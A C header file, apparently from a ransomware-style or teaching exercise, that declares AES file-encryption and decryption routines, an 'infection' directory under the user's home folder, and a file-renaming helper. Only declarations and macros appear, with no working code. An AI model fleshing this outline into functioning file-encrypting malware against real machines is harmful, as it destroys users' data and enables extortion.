#ifndef ENCRYPTION_H
#define ENCRYPTION_H

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/aes.h>
#include <sys/stat.h>
#include <dirent.h>

#define HOME getenv("HOME")
#define INFECTION_DIR "/infection"
#define KEY_SIZE 16
#define IV_SIZE 16

typedef struct {
    unsigned char *key;         // Encryption key
    unsigned char iv[16];          // Initialization vector
    unsigned char *input;       // Plaintext or Ciphertext
    unsigned char *output;      // Ciphertext or Plaintext (depending on operation)
    int input_len;              // Length of input data
    int output_len;             // Length of output data
} crypto_params;

// Encrypt
int     encrypt(crypto_params *params);
void    encrypt_files();

// Decrypt
int     decrypt(crypto_params *params);
void    decrypt_files(const char *key_hex);

// Utils
void    setup_infection_directory();
void    rename_file(const char *filename);
void    handle_errors();
void    hex_to_bin(const char *hex, unsigned char *bin, size_t len);

#endif // ENCRYPTION_H
